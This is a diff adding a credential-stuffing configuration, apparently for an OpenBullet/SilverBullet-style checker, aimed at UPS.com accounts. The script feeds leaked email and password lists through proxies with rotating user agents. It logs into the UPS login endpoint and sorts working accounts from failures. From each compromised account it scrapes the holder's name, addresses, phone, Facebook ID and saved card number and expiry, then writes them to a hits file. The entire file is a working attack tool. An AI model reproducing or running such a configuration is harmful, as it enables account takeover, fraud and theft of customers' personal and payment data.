@@ -1,0 +1,269 @@
+[SETTINGS]
+{
+  "Name": "UPS.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-02T17:06:20.4965041+04:30",
+  "AdditionalInfo": "@ups.com",
+  "RequiredPlugins": [],
+  "Author": "MrBlackX",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "UPS",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+SET VAR "one" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_8 rv:6.0) Gecko/20161025 Firefox/37.0"
+SET VAR "two" "Opera/8.44 (X11; Linux i686; en-US) Presto/2.8.179 Version/10.00"
+SET VAR "three" "Mozilla/5.0 (iPad; CPU OS 7_2_2 like Mac OS X; en-US) AppleWebKit/531.45.4 (KHTML, like Gecko) Version/4.0.5 Mobile/8B115 Safari/6531.45.4"
+SET VAR "four" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
+SET VAR "five" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0"
+SET VAR "ListUA" "<one>|<two>|<three>|<four>|<five>"
+
+#split UTILITY Variable "ListUA" Split "|" -> VAR "UA" 
+
+#randomua UTILITY List "UA" Random -> VAR "useragent" 
+
+#get_csrf REQUEST GET "https://www.ups.com/lasso/login" 
+  
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#csrf PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"CSRFToken\" name=\"CSRFToken\" value=\"" "\">" -> VAR "csrf" 
+
+#randint FUNCTION RandomNum "5000" "9999" -> VAR "randint" 
+
+#length FUNCTION Length "CSRFToken=<csrf>&loc=en_US&returnto=http%253A%252F%252Fwww.ups.com%252Fus%252Fen%252Fglobal.page&forgotpassword=YZ&connectWithSocial=YZ&userID=<USER>&password=<PASS>&rememberMe=1&getTokenWithPassword=&ioBlackBox=&ioElapsedTime=<randint>" -> VAR "len" 
+
+#login REQUEST POST "https://www.ups.com/lasso/login" 
+  CONTENT "CSRFToken=<csrf>&loc=en_US&returnto=http%253A%252F%252Fwww.ups.com%252Fus%252Fen%252Fglobal.page&forgotpassword=YZ&connectWithSocial=YZ&userID=<USER>&password=<PASS>&rememberMe=1&getTokenWithPassword=&ioBlackBox=&ioElapsedTime=<randint>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.ups.com" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: es-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <len>" 
+  HEADER "Origin: https://www.ups.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.ups.com/lasson/login?loc=en_US&returnto=https%3A%2F%2Fwww.ups.com%2Fus%2Fen%2Fglobal.page" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The information that you have entered does not match any ups.com profile" 
+    KEY "LASSO_1010" 
+    KEY "<check>" Contains "false" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+
+#get_xsrf REQUEST GET "https://wwwapps.ups.com/ppc/ppc.html?loc=en_CA#/payment" 
+  
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#own_addr REQUEST POST "https://wwwapps.ups.com/ppc/Profile/GetAllAccountDetailsForProfile?loc=en_CA&PPCTransactionId=988bae297dad4cbcb6ad87b5779a8bf0PR_A1" 
+  CONTENT "\"\"" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: wwwapps.ups.com" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-XSRF-TOKEN: <COOKIES(PPC-XSRF-TOKEN)>" 
+  HEADER "Content-Length: 2" 
+  HEADER "Origin: https://wwwapps.ups.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://wwwapps.ups.com/ppc/ppc.html?loc=en_CA" 
+  HEADER "Cache-Control: max-age=0" 
+
+#name PARSE "<SOURCE>" LR "\",\"Name\":\"" "\",\"" -> CAP "name" 
+
+IF "<name>" EqualTo "null"
+SET VAR "name" "N/A"
+ENDIF
+IF "<name>" EqualTo ""
+SET VAR "name" "N/A"
+ENDIF
+
+#street PARSE "<SOURCE>" LR "{\"AddressLine1\":\"" "\",\"" -> CAP "street" 
+
+IF "<street>" EqualTo "null"
+SET VAR "street" "N/A"
+ENDIF
+IF "<street>" EqualTo ""
+SET VAR "street" "N/A"
+ENDIF
+
+#street2 PARSE "<SOURCE>" LR ",\"AddressLine2\":\"" "\",\"" -> CAP "street2" 
+
+IF "<street2>" EqualTo "null"
+SET VAR "street2" "N/A"
+ENDIF
+IF "<street2>" EqualTo ""
+SET VAR "street2" "N/A"
+ENDIF
+
+#street3 PARSE "<SOURCE>" LR ",\"AddressLine3\":\"" "\",\"" -> CAP "street3" 
+
+IF "<street3>" EqualTo "null"
+SET VAR "street3" "N/A"
+ENDIF
+IF "<street3>" EqualTo ""
+SET VAR "street3" "N/A"
+ENDIF
+
+#city PARSE "<SOURCE>" LR ",\"City\":\"" "\",\"" -> CAP "city" 
+
+IF "<city>" EqualTo "null"
+SET VAR "city" "N/A"
+ENDIF
+IF "<city>" EqualTo ""
+SET VAR "city" "N/A"
+ENDIF
+
+#country PARSE "<SOURCE>" LR ",\"Country\":\"" "\",\"" -> CAP "country" 
+
+IF "<country>" EqualTo "null"
+SET VAR "country" "N/A"
+ENDIF
+IF "<country>" EqualTo ""
+SET VAR "country" "N/A"
+ENDIF
+
+#phone PARSE "<SOURCE>" LR ",\"PhoneNumber\":\"" "\",\"" -> CAP "phone" 
+
+IF "<phone>" EqualTo "null"
+SET VAR "phone" "N/A"
+ENDIF
+IF "<phone>" EqualTo ""
+SET VAR "phone" "N/A"
+ENDIF
+IF "<phone>" DoesNotContain "N/A"
+SET VAR "phone" "+1 <phone>"
+ENDIF
+
+#province PARSE "<SOURCE>" LR "\",\"StateProvince\":\"" "\",\"" -> CAP "province" 
+
+IF "<province>" EqualTo "null"
+SET VAR "province" "N/A"
+ENDIF
+IF "<phone>" EqualTo ""
+SET VAR "province" "N/A"
+ENDIF
+
+#fbid PARSE "<SOURCE>" LR ",\"FacebookId\":\"" "\",\"" -> CAP "fbid" 
+
+IF "<fbid>" EqualTo "null"
+SET VAR "fbid" "N/A"
+ENDIF
+IF "<fbid>" EqualTo ""
+SET VAR "fbid" "N/A"
+ENDIF
+
+#userid PARSE "<SOURCE>" LR ",\"UserID\":\"" "\",\"" -> CAP "userid" 
+
+IF "<userid>" EqualTo "null"
+SET VAR "userid" "N/A"
+ENDIF
+IF "<userid>" EqualTo ""
+SET VAR "userid" "N/A"
+ENDIF
+
+#addr REQUEST POST "https://wwwapps.ups.com/ppc/Profile/GetAllPaymentMethods?loc=en_CA&PPCTransactionId=988bae297dad4cbcb6ad87b5779a8bf0PR_A2" 
+  CONTENT "{\"Locale\":\"en_CA\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: wwwapps.ups.com" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-XSRF-TOKEN: <COOKIES(PPC-XSRF-TOKEN)>" 
+  HEADER "Content-Length: 18" 
+  HEADER "Origin: https://wwwapps.ups.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://wwwapps.ups.com/ppc/ppc.html?loc=en_CA" 
+  HEADER "Cache-Control: max-age=0" 
+
+#cardname PARSE "<SOURCE>" LR ",\"NickName\":\"" "\"" -> CAP "cardname" 
+
+IF "<cardname>" EqualTo "null"
+SET VAR "cardname" "N/A"
+ENDIF
+IF "<cardname>" EqualTo ""
+SET VAR "cardname" "N/A"
+ENDIF
+
+#cardnum PARSE "<SOURCE>" LR ",\"Number\":\"" "\"," -> CAP "cardnum" 
+
+IF "<cardnum>" EqualTo "null"
+SET VAR "<cardnum>" "N/A"
+ENDIF
+IF "<cardnum>" EqualTo ""
+SET VAR "<cardnum>" "N/A"
+ENDIF
+
+#cardexp PARSE "<SOURCE>" LR ",\"ExpiryInfoForCard\":\"" "\"," -> CAP "cardexp" 
+
+IF "<cardexp>" EqualTo "null"
+SET VAR "cardexp" "N/A"
+ENDIF
+IF "<cardexp>" EqualTo ""
+SET VAR "cardexp" "N/A"
+ENDIF
+
+#save_hits UTILITY File "UPS Hits.txt" AppendLines "[ - - - < A C C O U N T > - - -]\\n\\nEmail : <USER>\\nPassword: <PASS>\\nUser ID : <userid>\\nName : <name>\\nStreet : <street>\\nStreet 2 : <street2>\\nStreet 3 : <street3>\\nCity : <city>\\nPhone : <phone>\\nProvince : <province>\\nCountry : <country>\\nFacebook ID : <fbid>\\nPayment Method : <cardname>\\nCard Number : <cardnum>\\nCard Expiry Date : <cardexp>\\nLogin: https://www.ups.com/lasso/login\\nMade By @MrBlackX\\n\\n[ - - - < U P S.C O M | C O N F I G > - - - ]\\n" -> CAP "Save Hits" 
+
